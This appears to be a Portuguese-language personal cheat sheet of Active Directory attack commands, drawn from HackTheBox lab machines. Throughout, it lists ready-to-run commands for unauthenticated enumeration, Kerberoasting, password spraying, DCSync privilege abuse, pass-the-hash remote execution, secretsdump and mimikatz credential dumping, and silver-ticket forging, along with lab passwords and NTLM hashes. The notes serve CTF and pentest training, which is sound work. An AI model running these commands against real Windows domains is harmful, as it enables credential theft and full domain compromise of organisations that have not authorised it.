Resumo AD Hacking
========================

Muitas coisas foram colocadas em prática na máquina [Forest](InfraHacking%2FCTFs%2FHackTheBox%2FForest.md#Adicionais)

[Active](InfraHacking%2FCTFs%2FHackTheBox%2FActive.md)

# Enumeration no creds

##  Obtem Dominio

1 - Obter nome de dominio:

    enum4linux -a <hostname>
    
    ##atenção com este comando, porque o domínio que me retornou não foi o mesmo identificado no primeiro comando.
    
    crackmapexec smb <ip>
    

## Enumerate shares null session

    smbclient -U '' -N -L <ip>
    
    crackmapexec smb 10.10.10.179 -u '' -p '' --shares
    
    sudo nmap -p 445,139 -Pn -T5 10.10.10.179 --script smb-enum-shares
    
GUEST ACCESS

    smbclient -U 'guest%' -N -L <ip>
    
    crackmapexec smb 10.10.10.179 -u '' -p '' --shares
    
## RPC null session
    
    rpcclient -N -U '' <ip>

    srvinfo
    querydominfo
    enumdomusers
    enumdomgroups
    querygroup 0x200

    netshareenum
    netshareenumall

## Enumerate LDAP

    ldapsearch -x -H ldap://10.10.10.179 -s base

## Enumerate users

Obter nome de usuário válido

    kerbrute enumuser -d THM-AD --dc 10.10.221.144 usernames.txt
    
    enum4linux -U 10.10.10.179
    
    kerbrute userenum --domain oscp.exam /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 192.168.115.100
    
### powershell

#### oneliner(users)

    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Searcher.FindAll()
 
#### users detailed information

     $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Result = $Searcher.FindAll(); Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}Write-Host "------------------------"}


#### oneliner (grupos)
 
     $ldapFilter = "(objectClass=Group)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.name}
 
#### oneliner (sub grupos)
 
     $ldapFilter = "(name=LAPS_Readers)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties}

#### Group members     
     $ldap_filter = "(name=LAPS_Readers)"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}

#### Service Principal Names
     $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="serviceprincipalname=*";$Result = $Searcher.FindAll();Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}}
     

## Kerberoasting

    impacket-GetNPUsers -dc-ip 10.10.10.248 intelligence.htb/ -usersfile usernames.txt -format john -outputfile hashes
 
     ./r.exe kerberoast /domain:timelapse.htb /dc:dc01.timelapse.htb
    
# Com credencial

## Enumerar shares

    smbclient -L 10.129.245.180 -U 'balckfield.local/support' --password '#00^BlackKnight'

    enum4linux -u mhope -p '4n0therD4y@n0th3r$' 10.10.10.172
    
## Password spray com crackmapexec

    crackmapexec smb 10.10.10.248 -u usernames.txt -p 'NewIntelligenceCorpUser9876'
    
## Bloodhound

    bloodhound-python -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -v --zip -c All -dc MEGABANK.LOCAL -ns 10.10.10.172
    
## Hashes

    impacket-GetNPUsers -request -format john -outputfile hashes.txt -dc-ip 10.10.10.103 'HTB.LOCAL/amanda:Ashare1972'
    
     ./r.exe kerberoast /domain:timelapse.htb /dc:dc01.timelapse.htb
    
## WinPEAS

Esse ponto aqui é interessante, poorque geralmente em domínio pode ser que as pessoas deixem salvo o as credenciais em algum arquivo, um histórico de powershell ou algo assim. Vide exemplo disso no timelapse:

    ÉÍÍÍÍÍÍÍÍÍÍ¹ Found History Files
    File: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

```
    type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    whoami
    ipconfig /all
    netstat -ano |select-string LIST
    $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
    $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
    $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
    invoke-command -computername localhost -credential $c -port 5986 -usessl -
    SessionOption $so -scriptblock {whoami}
    get-aduser -filter * -properties *
    exit
```

## DCSync

Aqui temos algo relevante para a gente considerar em meio aos testes. São as más configurações de grupos de access list do AD. Falhas de permissionamento dde cada grupo no qual o usuário pelo qual comprometemos a máquina faz parte.

Mas nesse caso temos que olhar para, pelo menos, dois permissionamentos pertinentes pra gente escalar privilégio dentro do domínio, sendo elas:

    WriteDacl
    DCSync
 
No caso de WriteDacl, temos que considerar a alteração de privilégio que o usuário com essa permissão tem para fazer aos demais usuários, como na máquina [Forest](InfraHacking%2FCTFs%2FHackTheBox%2FForest.md).

Basicamente é adicionar um usuário ao domínio no grupo "Exchange Windows Permissions" com os seguintes comandos:

    net user /domain /add redteam R3dT3@m
    net group "Exchange Windows Permissions" /add redteam

Precisaremos do powerview para fazer essa alteração de privilégios, porém temos duas formas, então vamos lá:

### PowerView

### impacket-ntlmrelayx


## Try command execution

    impacket-psexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
    impacket-smbexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
    evil-winrm -i 10.10.10.103 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
    wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
    impacket-psexec HTB.LOCAL\amanda:Ashare1972@10.10.10.103
    impacket-smbexec HTB.LOCAL\amanda:Ashare1972@10.10.10.103
    evil-winrm -u amanda -p Ashare1972 -i 10.10.10.103

## Dump hashes (DCSync Privileges required)

    impacket-secretsdump 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'


## Generate NTLM hash

    python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Password".encode("utf-16le")).digest()))'
    #ou
    iconv -f ASCII -t UTF-16LE <(printf "Password") | openssl dgst -md4

## Domain SID

    impacket-getPac -targetUser administrator <domain>/<user>:<password>
    #Example:
    impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson

Outra possibildade

    ldapsearch -H ldaps://dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local" "(objectClass=user)"

![qownnotes-media-LYRNMJ](../../media/qownnotes-media-LYRNMJ.png)

```
#!/bin/bash

# Base-64 encoded objectSid
OBJECT_ID=$1

# Decode it, hex-dump it and store it in an array
G=($(echo -n $OBJECT_ID | base64 -d -i | hexdump -v -e '1/1 " %02X"'))

# SID in HEX
# SID_HEX=${G[0]}-${G[1]}-${G[2]}${G[3]}${G[4]}${G[5]}${G[6]}${G[7]}-${G[8]}${G[9]}${G[10]}${G[11]}-${G[12]}${G[13]}${G[14]}${G[15]}-${G[16]}${G[17]}${G[18]}${G[19]}-${G[20]}${G[21]}${G[22]}${G[23]}-${G[24]}${G[25]}${G[26]}${G[27]}${G[28]}

# SID Structure: https://technet.microsoft.com/en-us/library/cc962011.aspx
# LESA = Little Endian Sub Authority
# BESA = Big Endian Sub Authority
# LERID = Little Endian Relative ID
# BERID = Big Endian Relative ID

BESA2=${G[8]}${G[9]}${G[10]}${G[11]}
BESA3=${G[12]}${G[13]}${G[14]}${G[15]}
BESA4=${G[16]}${G[17]}${G[18]}${G[19]}
BESA5=${G[20]}${G[21]}${G[22]}${G[23]}
BERID=${G[24]}${G[25]}${G[26]}${G[27]}${G[28]}

LESA1=${G[2]}${G[3]}${G[4]}${G[5]}${G[6]}${G[7]}
LESA2=${BESA2:6:2}${BESA2:4:2}${BESA2:2:2}${BESA2:0:2}
LESA3=${BESA3:6:2}${BESA3:4:2}${BESA3:2:2}${BESA3:0:2}
LESA4=${BESA4:6:2}${BESA4:4:2}${BESA4:2:2}${BESA4:0:2}
LESA5=${BESA5:6:2}${BESA5:4:2}${BESA5:2:2}${BESA5:0:2}
LERID=${BERID:6:2}${BERID:4:2}${BERID:2:2}${BERID:0:2}

LE_SID_HEX=${LESA1}-${LESA2}-${LESA3}-${LESA4}-${LESA5}-${LERID}

# Initial SID value which is used to construct actual SID
SID="S-1"

# Convert LE_SID_HEX to decimal values and append it to SID as a string
IFS='-' read -ra ADDR <<< "${LE_SID_HEX}"
for OBJECT in "${ADDR[@]}"; do
  SID=${SID}-$((16#${OBJECT}))
done

echo ${SID}
```
Colocar esse script em um arquivo para executá-lo e passar o SID do domínio como parâmetro:

    vi sid.sh
    chmod +x sid.sh
    ./sid.sh <DOMAIN_SID>
    # Example:
    ./sid.sh AQUAAAAAAAUVAAAAhQSCo0F98mxA04uXUwYAAA==
    S-1-5-21-2743207045-1827831105-2542523200-1619
    #Desconsiderar o -1619
    


## Generate Silver ticket

Prerequisites: NTLM Hash, Domain SID e SPN

    impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
    
    KRB5CCNAME=administrator.ccache klist
    
    KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local

The output file is administrator.ccache, which is a kerberos ticket as administrator that only the MSSQL service will trust.

## Kerbroasting

    impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.205.44 -request

Assim que conseguir quebrar o hash de senha com o que resultar do comando acima, podemos considerar duas possibildades:

Geração do silver ticket conforme os comandos abaixo:

    impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
    
    KRB5CCNAME=administrator.ccache klist
    
    KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
    
ou com mimikatz localmente na máquina:

    ./m.exe
    kerberos::purge
    kerberos::golden /user:Administrator /domain:active.htb /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:MSSQLSvc/dc1.scrm.local:1433 /service:MSSQLSvc /rc4:<NTLM_HASH> /ptt

### mimikatz

    sekurlsa::tickets
    sekurlsa::logonpasswords
    sekurlsa::tickets /export
    kerberos::list /export
    